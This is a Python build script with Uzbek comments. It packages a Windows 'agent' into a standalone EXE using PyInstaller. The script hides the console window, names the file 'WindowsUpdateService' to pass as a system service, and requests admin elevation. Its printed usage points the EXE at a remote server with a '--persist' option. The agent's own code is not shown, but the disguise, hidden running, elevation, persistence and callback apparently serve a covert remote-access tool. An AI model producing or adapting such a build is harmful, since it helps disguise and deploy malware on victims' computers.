"""
Build Windows Agent to Standalone EXE
Python o'rnatilmagan kompda ishlaydigan EXE yaratish
"""

import os
import sys
import subprocess
import shutil

def build_windows_agent():
    """Windows agent'ni EXE ga aylantirish"""
    
    print("🔧 PyInstaller bilan EXE yaratilmoqda...\n")
    
    # PyInstaller o'rnatilganmi tekshirish
    try:
        import PyInstaller
        print("✅ PyInstaller topildi")
    except ImportError:
        print("❌ PyInstaller topilmadi")
        print("📦 O'rnatilmoqda: pip install pyinstaller")
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"])
        print("✅ PyInstaller o'rnatildi\n")
    
    # Agent path
    agent_script = os.path.join("agent", "windows_agent.py")
    
    if not os.path.exists(agent_script):
        print(f"❌ {agent_script} topilmadi!")
        return False
    
    # PyInstaller options
    options = [
        agent_script,
        "--onefile",                    # Bitta EXE
        "--noconsole",                  # Console window yashirish (background)
        "--name=WindowsUpdateService",  # EXE nomi (Windows service'ga o'xshash)
        "--icon=NONE",                  # Icon (agar kerak bo'lsa qo'shing)
        "--clean",                      # Eski build'larni tozalash
        "--distpath=dist",              # Output papka
        "--workpath=build",             # Temporary build papka
        "--specpath=.",                 # Spec file location
        
        # Hidden imports (agar kerak bo'lsa)
        # "--hidden-import=requests",
        # "--hidden-import=psutil",
        
        # Optimize
        "--optimize=2",                 # Bytecode optimization
        
        # Windows specific
        "--uac-admin",                  # UAC elevation (admin huquqi so'rash)
        
        # Version info (optional)
        # "--version-file=version.txt",
    ]
    
    print("🔨 Build boshlanmoqda...")
    print(f"📄 Script: {agent_script}")
    print(f"📦 Output: dist/WindowsUpdateService.exe\n")
    
    # Build
    try:
        result = subprocess.run(
            [sys.executable, "-m", "PyInstaller"] + options,
            check=True,
            capture_output=False
        )
        
        print("\n✅ Build muvaffaqiyatli!")
        print("\n📁 EXE joylashgan:")
        print(f"   {os.path.abspath('dist/WindowsUpdateService.exe')}")
        
        # EXE size
        exe_path = "dist/WindowsUpdateService.exe"
        if os.path.exists(exe_path):
            size_mb = os.path.getsize(exe_path) / (1024 * 1024)
            print(f"\n📊 Hajm: {size_mb:.2f} MB")
        
        print("\n💡 Ishlatish:")
        print("   dist\\WindowsUpdateService.exe http://server-ip:8000")
        print("   dist\\WindowsUpdateService.exe http://server.com --persist")
        
        return True
        
    except subprocess.CalledProcessError as e:
        print(f"\n❌ Build xatosi: {e}")
        return False


def build_with_console():
    """Console window bilan (debug uchun)"""
    
    print("🔧 Console version yaratilmoqda...\n")
    
    agent_script = os.path.join("agent", "windows_agent.py")
    
    options = [
        agent_script,
        "--onefile",
        "--name=WindowsAgent_Debug",
        "--clean",
        "--distpath=dist",
    ]
    
    try:
        subprocess.run(
            [sys.executable, "-m", "PyInstaller"] + options,
            check=True
        )
        
        print("\n✅ Console version tayyor!")
        print(f"   {os.path.abspath('dist/WindowsAgent_Debug.exe')}")
        return True
        
    except subprocess.CalledProcessError as e:
        print(f"\n❌ Build xatosi: {e}")
        return False


def clean_build_files():
    """Build artifactlarini tozalash"""
    
    print("🧹 Build fayllarini tozalash...")
    
    # Folders to remove
    folders = ['build', '__pycache__', 'agent/__pycache__']
    files = ['WindowsUpdateService.spec', 'WindowsAgent_Debug.spec']
    
    for folder in folders:
        if os.path.exists(folder):
            shutil.rmtree(folder)
            print(f"  ✅ {folder}/ o'chirildi")
    
    for file in files:
        if os.path.exists(file):
            os.remove(file)
            print(f"  ✅ {file} o'chirildi")
    
    print("\n✅ Tozalash tugadi")


def main():
    """Main entry point"""
    
    print("""
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║          🔧 Windows Agent EXE Builder (PyInstaller) 🔧        ║
║                                                                ║
║     Python o'rnatilmagan kompda ishlaydigan EXE yaratish      ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
    """)
    
    print("Tanlang:")
    print("1. Background EXE (console window yo'q)")
    print("2. Console EXE (debug uchun)")
    print("3. Ikkalasi ham")
    print("4. Build fayllarini tozalash")
    print("5. Chiqish")
    
    choice = input("\nTanlov (1-5): ").strip()
    
    if choice == '1':
        build_windows_agent()
    elif choice == '2':
        build_with_console()
    elif choice == '3':
        build_windows_agent()
        print("\n" + "="*70 + "\n")
        build_with_console()
    elif choice == '4':
        clean_build_files()
    elif choice == '5':
        print("❌ Bekor qilindi")
    else:
        print("❌ Noto'g'ri tanlov!")


if __name__ == "__main__":
    main()
